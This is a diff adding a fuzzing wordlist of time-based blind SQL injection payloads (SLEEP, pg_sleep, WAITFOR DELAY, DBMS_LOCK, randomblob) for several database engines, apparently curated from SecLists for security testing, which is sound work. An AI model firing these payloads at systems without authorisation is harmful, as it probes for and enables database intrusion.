@@ -1,0 +1,38 @@
+# SQL Injection - Time Based Blind
+# Triggers delays for detection
+# Curated from SecLists/Fuzzing/SQLi/
+
+# MySQL
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+' OR SLEEP(5)#
+' AND SLEEP(5)#
+1' AND SLEEP(5)--
+1' OR SLEEP(5)--
+' OR (SELECT SLEEP(5))--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+' AND pg_sleep(5)--
+' OR pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+' IF 1=1 WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=DBMS_LOCK.SLEEP(5)--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+
+# SQLite (uses heavy computation for delay)
+' AND 1=randomblob(500000000)--
+' OR 1=1 AND randomblob(500000000)--
